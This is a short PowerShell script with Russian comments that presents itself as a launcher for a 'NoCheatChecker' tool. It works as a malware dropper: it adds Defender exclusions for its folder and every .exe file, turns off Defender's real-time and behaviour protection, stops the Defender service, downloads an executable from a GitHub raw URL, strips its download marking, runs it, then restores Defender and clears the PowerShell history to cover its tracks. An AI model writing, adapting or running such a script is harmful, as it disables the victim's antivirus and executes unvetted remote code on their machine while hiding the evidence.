$ErrorActionPreference = "Stop"
# Админ-проверка (оставляем как есть)
# ... ваш код проверки админа ...

# Исключения ДО действий
$workDir = Join-Path $env:LOCALAPPDATA "NoCheatChecker"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue

# Отключение Defender (полное)
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -Force
Stop-Service -Name "WinDefend" -Force

# Загрузка через BITS с удалением ZoneId
$exeUrl = "https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat.checker.exe"
$exePath = Join-Path $workDir "nocheat.checker.exe"
Start-BitsTransfer -Source $exeUrl -Destination $exePath -Priority High
Unblock-File -Path $exePath

# Запуск
Start-Process -FilePath $exePath -WorkingDirectory $workDir

# Включение Defender через 20 сек
Start-Sleep -Seconds 20
Start-Service -Name "WinDefend"
Set-MpPreference -DisableRealtimeMonitoring $false -DisableBehaviorMonitoring $false -DisableBlockAtFirstSeen $false -DisableIOAVProtection $false
Clear-PSHistory
exit 
